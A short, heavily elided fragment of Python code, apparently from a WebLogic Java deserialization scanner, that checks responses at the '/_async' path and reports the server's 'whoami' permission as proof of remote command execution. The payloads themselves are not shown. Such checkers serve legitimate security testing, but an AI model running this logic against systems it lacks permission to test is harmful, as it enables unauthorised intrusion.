...
def run(ip, port, index):
    ...
    r3 = requests.get(
        ...
        str(port) +
        '/_async/favicon.ico')
    if ((r1.status_code == 200) and 'uid' in r1.text) or (
            (r2.status_code == 202) and 'Vulnerable' in r3.text):
        web_info = '[+]The target weblogic has a JAVA deserialization vulnerability:{}{}'.format(
            VUL[index], "\n")
        return '{}[+]Your current permission is:  {}{}'.format(
            web_info, r1.text.replace('whoami : \r\n', ''), "\n")
    else:
        return '[-]Target weblogic not detected {}{}'.format(VUL[index], "\n")
